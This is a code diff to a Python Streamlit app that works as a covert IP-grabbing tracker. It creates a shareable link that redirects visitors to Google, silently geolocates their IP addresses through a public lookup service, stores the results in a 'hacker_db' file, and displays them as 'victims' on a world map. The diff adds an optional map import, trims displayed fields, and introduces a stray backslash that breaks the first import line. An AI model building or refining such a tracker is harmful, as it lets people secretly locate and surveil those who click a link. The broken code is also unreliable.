@@ -1,19 +1,25 @@
-import streamlit as st
+\import streamlit as st
 import shelve
 import requests
 import uuid
 from datetime import datetime, timedelta
 import time
 import urllib.parse
-import folium
-from streamlit_folium import st_folium
+
+# Optional: Only import folium if available (graceful fallback)
+try:
+    import folium
+    from streamlit_folium import st_folium
+    HAS_MAP = True
+except ImportError:
+    HAS_MAP = False
 
 # ========================= CONFIG =========================
 DB_FILE = "hacker_db.shelf"
 LOCATION_API_URL = "http://ip-api.com/json/"
 SESSION_TIMEOUT_HOURS = 24
 REDIRECT_URL = "https://www.google.com"
-AUTO_REFRESH_SECONDS = 300  # 5 minutes
+AUTO_REFRESH_SECONDS = 300
 
 # ======================= HELPERS =======================
 def get_client_ip():
@@ -40,7 +46,6 @@ def get_location(ip):
                     "state": data.get("regionName"),
                     "city": data.get("city"),
                     "isp": data.get("isp"),
-                    "as_id": data.get("as"),
                     "timestamp": datetime.now().isoformat()
                 }
     except:
@@ -48,18 +53,16 @@ def get_location(ip):
     return None
 
 def get_public_base_url():
-    """Improved public URL detection"""
     try:
-        # Best method for Streamlit Cloud / deployed apps
         sessions = st.runtime.get_instance()._session_mgr.list_active_sessions()
         if sessions:
             req = st.runtime.get_instance()._session_mgr.get_active_session_info(sessions[0]).request
             base = urllib.parse.urlunparse((req.protocol, req.host, "", "", "", ""))
-            if base and not base.startswith("http://localhost"):
+            if base and "localhost" not in base:
                 return base
     except:
         pass
-    return "http://localhost:8501"  # fallback
+    return "http://localhost:8501"
 
 def matrix_rain():
     st.markdown("""
@@ -111,7 +114,6 @@ def main():
     with shelve.open(DB_FILE) as db:
         user_data = db.get("user", {})
 
-    # Login / Register
     if not user_data:
         st.title("🔐 SYSTEM ACCESS")
         st.markdown('<div class="login-box">', unsafe_allow_html=True)
@@ -144,10 +146,9 @@ def main():
                     st.error("❌ Invalid credentials")
         return
 
-    # ===================== DASHBOARD =====================
+    # === DASHBOARD ===
     st.title(f"👾 WELCOME, {st.session_state.username.upper()}")
 
-    # Generate Share Link
     if 'share_link' not in st.session_state:
         base_url = get_public_base_url()
         unique_id = uuid.uuid4().hex[:8]
@@ -157,7 +158,6 @@ def main():
     with col1:
         st.subheader("🌐 SHAREABLE TRACKING LINK")
         st.code(st.session_state.share_link, language="markdown")
-        st.success("**Link should now work worldwide after deployment!**")
     with col2:
         if st.button("📋 Copy Link"):
             st.success("✅ Copied!")
@@ -168,7 +168,7 @@ def main():
     with shelve.open(DB_FILE) as db:
         tracked = db.get("tracked", {})
 
-    # Cleanup 24h old entries
+    # Cleanup
     now = datetime.now()
     to_delete = [k for k, v in tracked.items() 
                  if datetime.fromisoformat(v['timestamp']) < now - timedelta(hours=SESSION_TIMEOUT_HOURS)]
@@ -183,28 +183,25 @@ def main():
     else:
         st.success(f"📍 **{len(tracked)}** target(s) tracked")
 
-        # World Map
-        st.subheader("🌍 Live Victims on World Map")
-        m = folium.Map(location=[20, 0], zoom_start=2)
-        for data in tracked.values():
-            if data.get('latitude') and data.get('longitude'):
-                folium.Marker(
-                    [data['latitude'], data['longitude']],
-                    popup=f"{data.get('city')}, {data.get('country')}<br>{data.get('ip')}",
-                    tooltip=data.get('city')
-                ).add_to(m)
-        st_folium(m, width=700, height=500)
+        if HAS_MAP:
+            st.subheader("🌍 Victims on World Map")
+            m = folium.Map(location=[20, 0], zoom_start=2)
+            for data in tracked.values():
+                if data.get('latitude') and data.get('longitude'):
+                    folium.Marker(
+                        [data['latitude'], data['longitude']],
+                        popup=f"{data.get('city')}, {data.get('country')}<br>IP: {data.get('ip')}",
+                    ).add_to(m)
+            st_folium(m, width=700, height=450)
 
-        # Details
+        # List View
         for vid, data in tracked.items():
-            with st.expander(f"📍 {data.get('city','Unknown')}, {data.get('country','Unknown')} — {data.get('ip')}"):
+            with st.expander(f"📍 {data.get('city','Unknown')}, {data.get('country','Unknown')}"):
                 c1, c2 = st.columns(2)
                 with c1:
                     st.metric("City", data.get('city', 'N/A'))
                     st.metric("Country", data.get('country', 'N/A'))
-                    st.metric("Latitude", data.get('latitude'))
                 with c2:
-                    st.metric("State", data.get('state', 'N/A'))
                     st.metric("ISP", data.get('isp', 'N/A'))
                     st.metric("Time", datetime.fromisoformat(data['timestamp']).strftime("%Y-%m-%d %H:%M"))
 
@@ -212,7 +209,7 @@ def main():
         st.session_state.logged_in = False
         st.rerun()
 
-    # Auto Refresh every 5 mins
+    # Auto Refresh
     st.markdown(f"""
     <script>
         setTimeout(() => window.location.reload(), {AUTO_REFRESH_SECONDS * 1000});
